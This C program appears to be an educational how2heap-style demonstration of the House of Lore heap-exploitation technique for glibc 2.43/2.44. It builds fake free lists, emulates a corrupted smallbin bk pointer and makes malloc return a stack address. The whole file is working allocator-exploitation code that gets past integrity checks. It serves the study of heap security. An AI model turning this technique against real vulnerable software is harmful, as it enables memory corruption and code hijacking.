/*
Demonstration of the House of Lore of glibc 2.43/2.44.
addapted by Imrane Haddaji (tabacc0)
Based on the original how2heap demo.
Linked and tested against glibc 2.43 and glibc 2.44



  if (in_smallbin_range (nb))
    {
      idx = smallbin_index (nb);
      bin = bin_at (av, idx);

      if ((victim = last (bin)) != bin)
        {
          bck = victim->bk;
	  if (__glibc_unlikely (bck->fd != victim))
	    malloc_printerr ("malloc(): smallbin double linked list corrupted");
          set_inuse_bit_at_offset (victim, nb);
          bin->bk = bck;
          bck->fd = bin;

[ ... ]
	      while (tcache->num_slots[tc_idx] != 0
		     && (tc_victim = last (bin)) != bin)
		{
		  if (tc_victim != NULL)
		    {
		      bck = tc_victim->bk;
		      set_inuse_bit_at_offset (tc_victim, nb);
[ ... ]
		      bin->bk = bck;
		      bck->fd = bin;

		      tcache_put (tc_victim, tc_idx);
[ ... ]
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>


int main(int argc, char * argv[]){


  char *target_chunk[4] = {0};
  char **target = &target_chunk[2];

  fprintf(stderr, "\nWelcome to the House of Lore\n");

  fprintf(stderr, "This is a version that deals with SmallBin checks and changes in Tcache\n");
  fprintf(stderr, "size and allocation pattern\n");
  fprintf(stderr, "\nOur goal is to return a pointer in the stack , target : %p\n",target);
  fprintf(stderr, "\naccounting for metadata the target_chunk is : %p\n",target_chunk);


  fprintf(stderr, "Allocating the victim chunk, to avoid filling/emptying the Tcache , we will\n");
  fprintf(stderr, "allocate a Large-sized chunk and cut it in the unsorted bin\n");
  char **victim = malloc(0x510);
  fprintf(stderr, "Allocated victim on the heap at %p of size 0x520(with metadata)\n", victim);

  fprintf(stderr, "Allocating a guard chunk in order to avoid consolidating the top chunk\n"
		  "with the victim during the free()\n");
  char *guard = malloc(0x1000);
  fprintf(stderr, "Allocated the large chunk on the heap at %p\n", guard);
  fprintf(stderr, "Freeing victim, it will be inserted in the unsorted bin\n", victim);
  free(victim);
  fprintf(stderr, "\nIn the unsorted bin the victim's fwd and bk pointers are the unsorted\n"
		  "bin's header address (libc addresses)\n");
  fprintf(stderr, "victim->fwd: %p\n", victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", victim[1]);
  fprintf(stderr, "Allocating a chunk that will be cut from victim in the unsorted bin\n");
  fprintf(stderr, "our allocation will be of size 0x400,so victim size is 0x110(with metadata)\n");
  char *cut = malloc(0x400);
  fprintf(stderr, "Our Victim has been pushed forward, update our victim pointer accordingly\n");
  victim = victim + 0x410/sizeof(victim);
  // victim-WORD_SIZE because we need to remove the header size 
  // in order to have the absolute address of the chunk
  char **victim_chunk = victim-2;
  fprintf(stderr, "Now performing a malloc that can't be handled by the UnsortedBin, nor the small bin\n");
  fprintf(stderr, "This means that the chunk %p will be inserted in front of the SmallBin\n", victim);

  char *put_smallbin = malloc(0x1000);
  fprintf(stderr, "The chunk that can't be handled by the unsorted bin, nor the SmallBin has\n"
		  "been allocated to %p\n", put_smallbin);

  fprintf(stderr, "The victim chunk has been sorted and its fwd and bk pointers updated\n");
  fprintf(stderr, "victim->fwd: %p\n", victim[0]);
  fprintf(stderr, "victim->bk: %p\n\n", victim[1]);

  fprintf(stderr, "create two fake chunk lists in the heap and link them to form a list of\n");
  fprintf(stderr, "16 chunks, these are used to bypass the Tcache stashing loop\n");
  printf("\nthe reason we create two lists is that when malloc wills start filling the\n");
  printf("the tcache with chunks from our list , it also starts setting the inuse bit\n");
  printf("for those chunk , but because those chunks are fake and are just contiguous\n");
  printf("chunk headers in memory, the inuse bit setting corrupts chunk headers ahead\n");
  printf("in the list, this has become a problem in these versions specifically\n");
  printf("because the tcache size has grown to 16.\n");

  printf("we already have inactive chunks that we used for guarding and sorting, use them\n");
  printf("as lists\n");

  char* (*fake_freelist0)[4] = (char* (*)[4])guard ;
  char* (*fake_freelist1)[4] = (char* (*)[4])put_smallbin ;

  printf("\nMake first list\n");
  for(int i=0; i<7; i++) {
    fake_freelist0[i][3] = (char*) fake_freelist0[i+1];
  }

  printf("Link the last element of the first list to the first element of the second list\n");
  fake_freelist0[7][3] = (char*)fake_freelist1;

  printf("Make second list\n");
  for(int i=0; i<7; i++) {
    fake_freelist1[i][3] = (char*)fake_freelist1[i+1];
  }
  printf("\nNow we have fake list of size 16\n");
  fprintf(stderr, "fake free-list at %p\n", fake_freelist0);

  printf("\nMake the last element of the fake list point to target_chunk\n");
  fake_freelist1[7][3] = (char*)target_chunk;

  printf("Make the first element of the fake list's fd point to victim to bypass the SmallBin\n");
  printf("Corruption check\n");
  fake_freelist0[0][2] = (char*)victim_chunk;





  //------------VULNERABILITY-----------

  fprintf(stderr, "Now emulating a vulnerability that can overwrite the victim->bk pointer\n");
  fprintf(stderr, "and make it point to our fake list\n");

  victim[1] = (char*)fake_freelist0; 

  //------------------------------------


  fprintf(stderr, "Now allocating a chunk with size equal to the first one freed\n");
  fprintf(stderr, "This should fill the Tcache by using our fake chunk lists leaving \n");
  fprintf(stderr, "target\n");

  char *trigger = malloc(0x100);
  fprintf(stderr, "Now take all the fake chunks in tcache out\n");
  for(int i=0; i<16; i++) {char *silence_gcc = malloc(0x100);}


  fprintf(stderr, "Our target is now the head of the smallbin , but if we try to allocate it\n");
  fprintf(stderr, "the Tcache stashing loop will start , so we should fake a list again \n");
  fprintf(stderr, "and make target->bk point to the fake list ,we should also make \n" 
		  "the head of the list's fd point to target so we don't crash\n");

  printf("Make first list\n");
  for(int i=0; i<7; i++) {
    fake_freelist0[i][3] = (char*) fake_freelist0[i+1];
  }
  printf("Link the last element of the first list to the first element of the second list\n");
  fake_freelist0[7][3] = (char*)fake_freelist1;
  printf("Make second list\n");
  for(int i=0; i<7; i++) {
    fake_freelist1[i][3] = (char*)fake_freelist1[i+1];
  }
  fake_freelist1[7][3] = (char*)fake_freelist1[7];
  printf("Make target chunk -> bk point to the fake list\n");
  target_chunk[3] =(char*) fake_freelist0;

  printf("Make fake lists head ->fd point to target_chunk to bypass SmallBin check\n");
  fake_freelist0[0][2] = (char*)target_chunk;
  fprintf(stderr, "Allocating now should return target\n");
  char **smallbin_head = malloc(0x100);
  fprintf(stderr, "\nchar *smallbin_head = malloc(0x100)\n");
  fprintf(stderr,"\nassert(smallbin_head == target);\n");
  assert(smallbin_head == target);
}
